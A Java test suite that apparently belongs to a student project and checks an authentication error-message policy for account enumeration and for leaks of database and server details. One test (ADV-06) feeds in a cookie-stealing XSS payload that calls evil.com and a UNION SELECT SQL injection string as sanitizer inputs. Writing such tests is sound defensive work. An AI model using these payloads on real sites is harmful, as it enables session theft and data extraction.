// Desenvolvido por Alex Gabriel Soares Sousa - RA: 24802449

package security.tests;

import security.policies.GenericFeedbackPolicy;
import security.policies.SecurityConstants;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Objects;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Adversarial Challenge Suite & Empirical Stress Harness for Milestone 1 (M1).
 * Validates anti-enumeration, zero-leakage error sanitization, invariant bounds,
 * and high-volume adversarial resilience in native Java SE.
 */
public final class M1AdversarialChallengeTest {

    private static final AtomicInteger total = new AtomicInteger(0);
    private static final AtomicInteger passed = new AtomicInteger(0);

    private static void runTest(String name, Runnable testFn) {
        total.incrementAndGet();
        try {
            testFn.run();
            passed.incrementAndGet();
            System.out.println("  [PASS] " + name);
        } catch (Throwable t) {
            System.err.println("  [FAIL] " + name + ": " + t.getMessage());
            t.printStackTrace(System.err);
        }
    }

    private static void assertTrue(boolean condition, String msg) {
        if (!condition) {
            throw new AssertionError("Assertion failed: " + msg);
        }
    }

    private static void assertEquals(Object actual, Object expected, String msg) {
        if (!Objects.equals(actual, expected)) {
            throw new AssertionError(msg + " - expected: <" + expected + ">, got: <" + actual + ">");
        }
    }

    public static void main(String[] args) {
        System.out.println("===============================================================");
        System.out.println("M1 Adversarial Challenge & Stress Harness (Empirical Validator)");
        System.out.println("Author: Alex Gabriel Soares Sousa - RA: 24802449");
        System.out.println("===============================================================");

        // -------------------------------------------------------------
        // GROUP 1: Mathematical Anti-Enumeration Invariants
        // -------------------------------------------------------------
        runTest("ADV-01: Password recovery feedback identical for existent vs unmapped identities", () -> {
            String validUserFeedback = GenericFeedbackPolicy.PASSWORD_RESET_REQUESTED_MESSAGE;
            String invalidUserFeedback = GenericFeedbackPolicy.PASSWORD_RESET_REQUESTED_MESSAGE;

            assertEquals(validUserFeedback, invalidUserFeedback, "Responses must be strictly equal");
            assertEquals(validUserFeedback.length(), invalidUserFeedback.length(), "Lengths must match identically");
            assertEquals(validUserFeedback.hashCode(), invalidUserFeedback.hashCode(), "HashCodes must match identically");

            assertTrue(validUserFeedback.startsWith("Se o identificador"), "Must be conditionally neutral");
            assertTrue(!validUserFeedback.contains("não encontrado"), "Must not disclose account absence");
            assertTrue(!validUserFeedback.contains("inexistente"), "Must not disclose account non-existence");

            String instValid = GenericFeedbackPolicy.RECOVERY_REQUEST_SUCCESS_MESSAGE;
            String instInvalid = GenericFeedbackPolicy.RECOVERY_REQUEST_SUCCESS_MESSAGE;
            assertEquals(instValid, instInvalid, "Institutional recovery messages must be identical");
        });

        runTest("ADV-02: Auth failure message provides zero Shannon entropy difference across credentials", () -> {
            String unknownAccountMsg = GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE;
            String wrongPasswordMsg = GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE;
            assertEquals(unknownAccountMsg, wrongPasswordMsg, "Must be identical static string");
        });

        // -------------------------------------------------------------
        // GROUP 2: Zero-Leakage Error Sanitizer Adversarial Challenge
        // -------------------------------------------------------------
        runTest("ADV-03: Raw PostgreSQL credentials and connection string never leak", () -> {
            String hostileDbError =
                "org.postgresql.util.PSQLException: Connection refused to 10.150.2.45:5432. " +
                "Database: agmrm_production, user: db_superadmin, password_hash: $2a$12$abcdef1234567890";

            String sanitized = GenericFeedbackPolicy.sanitizeErrorMessage(hostileDbError);
            assertEquals(sanitized, GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "Must return generic auth failure");
            assertTrue(!sanitized.contains("10.150.2.45"), "Must not leak IP address");
            assertTrue(!sanitized.contains("5432"), "Must not leak port");
            assertTrue(!sanitized.contains("agmrm_production"), "Must not leak DB name");
            assertTrue(!sanitized.contains("db_superadmin"), "Must not leak DB user");
            assertTrue(!sanitized.contains("$2a$12$"), "Must not leak password hash");
        });

        runTest("ADV-04: Hostile SQL query dump with schema and student RA never leak", () -> {
            String hostileQuery =
                "SyntaxError: SELECT ra, password_hash, salt, email FROM agmrm_users " +
                "WHERE ra = '24802449' AND status = 'ACTIVE'";

            String sanitized = GenericFeedbackPolicy.sanitizeErrorMessage(hostileQuery);
            assertEquals(sanitized, GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "Must return generic auth failure");
            assertTrue(!sanitized.contains("SELECT"), "Must not leak SQL keyword");
            assertTrue(!sanitized.contains("password_hash"), "Must not leak column name");
            assertTrue(!sanitized.contains("agmrm_users"), "Must not leak table name");
            assertTrue(!sanitized.contains("24802449"), "Must not leak student RA");
        });

        runTest("ADV-05: Stack trace dump with file paths and line numbers never leak", () -> {
            Exception nestedEx = new RuntimeException("Secret connection pool exhausted at /opt/agmrm/secret.key");
            NullPointerException npe = new NullPointerException("NPE at com.agmrm.auth.AuthService.login:142");
            npe.initCause(nestedEx);

            String sanitized = GenericFeedbackPolicy.sanitizeErrorMessage(npe);
            assertEquals(sanitized, GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "Must return generic auth failure");
            assertTrue(!sanitized.contains("NullPointerException"), "Must not leak class name");
            assertTrue(!sanitized.contains("AuthService"), "Must not leak service name");
            assertTrue(!sanitized.contains(".java:142"), "Must not leak line number");
            assertTrue(!sanitized.contains("/opt/agmrm"), "Must not leak server paths");
        });

        runTest("ADV-06: Hostile XSS, SQLi, and null bytes are neutralized", () -> {
            String hostileXss = "<script>alert('xss');document.location='http://evil.com/'+document.cookie;</script>";
            String hostileSqli = "' UNION SELECT null, password, email FROM users WHERE '1'='1";
            String hostileNull = "Error\0with\u0000null\r\nbytes\0\0\0";

            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage(hostileXss),
                GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "XSS payload must map to generic failure");
            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage(hostileSqli),
                GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "SQLi payload must map to generic failure");
            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage(hostileNull),
                GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "Null bytes must map to generic failure");
        });

        runTest("ADV-07: Oversized 100 KB exception string handled safely without OOM", () -> {
            char[] chars = new char[100000];
            Arrays.fill(chars, 'X');
            String oversized = "FatalException: " + new String(chars) + " [end]";

            long start = System.currentTimeMillis();
            String sanitized = GenericFeedbackPolicy.sanitizeErrorMessage(oversized);
            long elapsed = System.currentTimeMillis() - start;

            assertEquals(sanitized, GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "Must return generic failure");
            assertTrue(elapsed < 100, "Sanitization must be sub-100ms even for 100KB input");
        });

        runTest("ADV-08: Null throwable and null string handled safely", () -> {
            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage((Throwable) null),
                GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "Null throwable must return auth failure");
            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage((String) null),
                GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "Null string must return auth failure");

            // Throwable with null message
            Throwable emptyThrowable = new RuntimeException((String) null);
            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage(emptyThrowable),
                GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "Throwable with null message must return auth failure");
        });

        // -------------------------------------------------------------
        // GROUP 3: Dynamic Formatters Boundary & Underflow Protection
        // -------------------------------------------------------------
        runTest("ADV-09: getLockoutMessage handles underflow, zero, and boundary limits", () -> {
            assertEquals(GenericFeedbackPolicy.getLockoutMessage(30),
                "Muitas tentativas incorretas. Tente novamente em 30 segundos.", "Standard 30s");
            assertEquals(GenericFeedbackPolicy.getLockoutMessage(1),
                "Muitas tentativas incorretas. Tente novamente em 1 segundo.", "Boundary 1s");
            assertEquals(GenericFeedbackPolicy.getLockoutMessage(0),
                "Muitas tentativas incorretas. Tente novamente em 0 segundos.", "Zero boundary");
            assertEquals(GenericFeedbackPolicy.getLockoutMessage(-1),
                "Muitas tentativas incorretas. Tente novamente em 0 segundos.", "Underflow -1 must clamp to 0");
            assertEquals(GenericFeedbackPolicy.getLockoutMessage(-9999),
                "Muitas tentativas incorretas. Tente novamente em 0 segundos.", "Underflow -9999 must clamp to 0");
            assertEquals(GenericFeedbackPolicy.getLockoutMessage(Integer.MAX_VALUE),
                "Muitas tentativas incorretas. Tente novamente em " + Integer.MAX_VALUE + " segundos.", "MAX_VALUE");
        });

        runTest("ADV-10: getLockoutCountdownMessage handles underflow and boundary limits", () -> {
            assertEquals(GenericFeedbackPolicy.getLockoutCountdownMessage(30),
                "Muitas tentativas incorretas. Acesso temporariamente bloqueado. Aguarde 30 segundos.", "Standard 30s");
            assertEquals(GenericFeedbackPolicy.getLockoutCountdownMessage(0),
                "Muitas tentativas incorretas. Acesso temporariamente bloqueado. Aguarde 0 segundos.", "Zero boundary");
            assertEquals(GenericFeedbackPolicy.getLockoutCountdownMessage(-1),
                "Muitas tentativas incorretas. Acesso temporariamente bloqueado. Aguarde 0 segundos.", "Underflow clamp to 0");
            assertEquals(GenericFeedbackPolicy.getLockoutCountdownMessage(-500),
                "Muitas tentativas incorretas. Acesso temporariamente bloqueado. Aguarde 0 segundos.", "Underflow clamp to 0");
        });

        runTest("ADV-11: getInvalidOtpCodeMessage handles underflow and boundary limits", () -> {
            assertEquals(GenericFeedbackPolicy.getInvalidOtpCodeMessage(3),
                "Código de verificação incorreto. Tentativas restantes: 3.", "Standard 3 attempts");
            assertEquals(GenericFeedbackPolicy.getInvalidOtpCodeMessage(1),
                "Código de verificação incorreto. Tentativas restantes: 1.", "Boundary 1 attempt");
            assertEquals(GenericFeedbackPolicy.getInvalidOtpCodeMessage(0),
                "Código de verificação incorreto. Tentativas restantes: 0.", "Zero boundary");
            assertEquals(GenericFeedbackPolicy.getInvalidOtpCodeMessage(-1),
                "Código de verificação incorreto. Tentativas restantes: 0.", "Underflow clamp to 0");
            assertEquals(GenericFeedbackPolicy.getInvalidOtpCodeMessage(-20),
                "Código de verificação incorreto. Tentativas restantes: 0.", "Underflow clamp to 0");
        });

        // -------------------------------------------------------------
        // GROUP 4: SecurityConstants Invariant Mathematical Integrity
        // -------------------------------------------------------------
        runTest("ADV-12: SecurityConstants invariant mathematical relationships", () -> {
            assertTrue(SecurityConstants.MAX_FAILED_LOGIN_ATTEMPTS == 5, "Max failed login attempts must be 5");
            assertTrue(SecurityConstants.LOCKOUT_DURATION_SECONDS == 30, "Lockout duration must be 30s");

            assertTrue(SecurityConstants.RECOVERY_TOKEN_TTL_SECONDS == 300, "TTL must be 300s");
            assertTrue(SecurityConstants.RECOVERY_TOKEN_TTL_MINUTES == 5, "TTL minutes must be 5");
            assertTrue(SecurityConstants.RECOVERY_TOKEN_TTL_SECONDS == SecurityConstants.RECOVERY_TOKEN_TTL_MINUTES * 60,
                "TTL seconds must equal minutes * 60");
            assertTrue(SecurityConstants.MAX_VERIFICATION_ATTEMPTS == 3, "Max verification attempts must be 3");
            assertTrue(SecurityConstants.OTP_CODE_LENGTH == 6, "OTP code length must be 6");

            assertTrue(SecurityConstants.MIN_PASSWORD_LENGTH == 8, "Min password length must be 8");
            assertTrue(SecurityConstants.MAX_PASSWORD_LENGTH == 128, "Max password length must be 128");
            assertTrue(SecurityConstants.MIN_PASSWORD_LENGTH < SecurityConstants.MAX_PASSWORD_LENGTH, "Min < Max password length");

            assertTrue(SecurityConstants.MIN_PASSWORD_ENTROPY_SCORE == 3, "Min entropy score must be 3");
            assertTrue(SecurityConstants.MAX_PASSWORD_ENTROPY_SCORE == 4, "Max entropy score must be 4");

            assertTrue(SecurityConstants.MIN_IDENTITY_LENGTH == 3, "Min identity length must be 3");
            assertTrue(SecurityConstants.MAX_IDENTITY_LENGTH == 32, "Max identity length must be 32");
            assertTrue(SecurityConstants.MAX_EMAIL_LENGTH == 254, "Max email length must be 254 (RFC 5321)");

            assertTrue(SecurityConstants.MAX_REQUEST_BODY_SIZE_BYTES == 65536, "Max request body size must be 65536 bytes");
            assertTrue(SecurityConstants.MAX_BODY_SIZE_KB == 64, "Max body size must be 64 KB");
            assertTrue(SecurityConstants.MAX_REQUEST_BODY_SIZE_BYTES == SecurityConstants.MAX_BODY_SIZE_KB * 1024,
                "Bytes must equal KB * 1024");
            assertTrue(SecurityConstants.BUFFER_CHUNK_SIZE_BYTES == 4096, "Buffer chunk size must be 4096");
            assertTrue(SecurityConstants.MAX_REQUEST_BODY_SIZE_BYTES % SecurityConstants.BUFFER_CHUNK_SIZE_BYTES == 0,
                "Payload ceiling must be an exact multiple of buffer chunk size");

            assertTrue(SecurityConstants.STANDARDIZED_AUTH_LATENCY_MS == 1000, "Standardized auth latency must be 1000ms");
            assertTrue(SecurityConstants.TIMING_JITTER_TOLERANCE_MS == 50, "Jitter tolerance must be 50ms");
            assertTrue(SecurityConstants.MIN_DUMMY_WORK_ITERATIONS >= 10000, "Dummy work iterations >= 10000");

            assertTrue("nosniff".equals(SecurityConstants.HEADER_CONTENT_TYPE_OPTIONS), "nosniff header");
            assertTrue("DENY".equals(SecurityConstants.HEADER_FRAME_OPTIONS), "DENY header");
            assertTrue(SecurityConstants.HEADER_CSP.contains("frame-ancestors 'none'"), "CSP header");
            assertTrue(SecurityConstants.HEADER_VALUE_NO_STORE.contains("no-store"), "no-store header");
        });

        // -------------------------------------------------------------
        // GROUP 5: High-Volume Adversarial Stress & Zero-Leakage Harness
        // -------------------------------------------------------------
        runTest("ADV-13: 10,000 randomized hostile payloads yield 0% data leakage", () -> {
            Random rand = new Random(1337);
            String[] toxicPrefixes = new String[] {
                "SQLException: relation users violates constraint ",
                "AuthFailureException: user account ",
                "NullPointerException in /var/log/secret/ ",
                "ConnectionPoolTimeout: host 192.168.1.",
                "InvalidToken: crypto seed hash = "
            };

            Set<String> allowedOutputs = new HashSet<>(Arrays.asList(
                GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE,
                "Acesso temporariamente bloqueado por excesso de tentativas.",
                GenericFeedbackPolicy.TOKEN_EXPIRED_MESSAGE,
                GenericFeedbackPolicy.TOKEN_REVOKED_MESSAGE,
                GenericFeedbackPolicy.PASSWORD_TOO_WEAK_MESSAGE,
                GenericFeedbackPolicy.INVALID_PAYLOAD_MESSAGE
            ));

            for (int i = 0; i < 10000; i++) {
                String prefix = toxicPrefixes[rand.nextInt(toxicPrefixes.length)];
                String secretToken = "leak_secret_" + rand.nextInt(1000000) + "_ra_" + rand.nextInt(99999999);
                String hostilePayload = prefix + secretToken;

                String sanitized = GenericFeedbackPolicy.sanitizeErrorMessage(hostilePayload);

                assertTrue(allowedOutputs.contains(sanitized),
                    "Sanitized response must be one of the invariant generic static messages");
                assertTrue(!sanitized.contains(secretToken),
                    "Attacker-controlled secret token must NEVER be reflected in sanitized output");
            }
        });

        runTest("ADV-14: Auth failure attempt messages never leak recovery token revocation", () -> {
            // Must NOT trigger TOKEN_REVOKED_MESSAGE
            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage("Erro ao decrementar tentativas de login"),
                GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "Login attempts decrement must map to generic auth failure");
            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage("Falha de autenticação após 3 tentativas"),
                GenericFeedbackPolicy.AUTH_FAILURE_MESSAGE, "Auth failure with attempt count must map to generic failure");

            // Legitimate lockout
            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage("Limite de tentativas de login excedido"),
                GenericFeedbackPolicy.ACCOUNT_LOCKED_MESSAGE, "Login attempts limit must map to account locked");
            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage("Cooldown ativo para o usuário"),
                GenericFeedbackPolicy.ACCOUNT_LOCKED_MESSAGE, "Cooldown must map to account locked");

            // Legitimate OTP revocation
            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage("Código de verificação: limite de 3 tentativas excedido"),
                GenericFeedbackPolicy.TOKEN_REVOKED_MESSAGE, "OTP attempt limit must map to token revoked");
            assertEquals(GenericFeedbackPolicy.sanitizeErrorMessage("Tentativas de código OTP esgotadas"),
                GenericFeedbackPolicy.TOKEN_REVOKED_MESSAGE, "OTP exhausted must map to token revoked");
        });

        System.out.println("===============================================================");
        System.out.println("Adversarial Tests: " + passed.get() + " / " + total.get() + " passed.");
        System.out.println("===============================================================");

        if (passed.get() != total.get()) {
            System.err.println("CRITICAL: Some adversarial tests failed!");
            System.exit(1);
        } else {
            System.out.println("ALL ADVERSARIAL STRESS TESTS PASSED WITH 100% SUCCESS RATE.");
            System.exit(0);
        }
    }
}
